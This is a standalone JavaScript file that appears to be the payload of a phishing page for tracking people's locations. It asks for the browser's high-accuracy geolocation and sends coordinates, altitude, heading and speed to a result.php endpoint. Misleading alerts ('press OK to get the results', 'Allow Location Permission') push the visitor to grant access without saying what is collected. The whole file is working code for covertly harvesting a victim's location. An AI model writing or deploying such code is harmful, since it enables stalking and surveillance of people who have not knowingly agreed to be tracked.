function locationData() {
    if (navigator.geolocation) {
        var optn = {enableHighAccuracy: true, timeout: 30000, maximumage: 0};
        navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
    } else {
        alert('Geolocation is not Supported by your Browser...');
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var acc = position.coords.accuracy;
        var alt = position.coords.altitude;
        var dir = position.coords.heading;
        var spd = position.coords.speed;

        $.ajax({
            type: "POST",
            url: "result.php",
            data: {
                latitude: lat,
                longitude: lon,
                accuracy: acc,
                altitude: alt,
                direction: dir,
                speed: spd,
            },
            success: function () {
                $("#change").html("Updating...");
            },
            mimeType: "text",
        });
        alert('Ok you got it! press "OK" button to get the results :)');
    }
}

function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            var denied = 'User denied the request for Geolocation';
            alert('Please Refresh This Page and Allow Location Permission...');
            break;
        case error.POSITION_UNAVAILABLE:
            var unavailable = 'Location information is unavailable';
            break;
        case error.TIMEOUT:
            var timeout = 'The request to get user location timed out';
            alert('Please Set Your Location Mode on High Accuracy...');
            break;
        case error.UNKNOWN_ERROR:
            var unknown = 'An unknown error occurred';
            break;
    }

    $.ajax({
        type: 'POST',
        url: 'error.php',
        data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
        success: function () {
            $('#change').html('Failed');
        },
        mimeType: 'text'
    });
}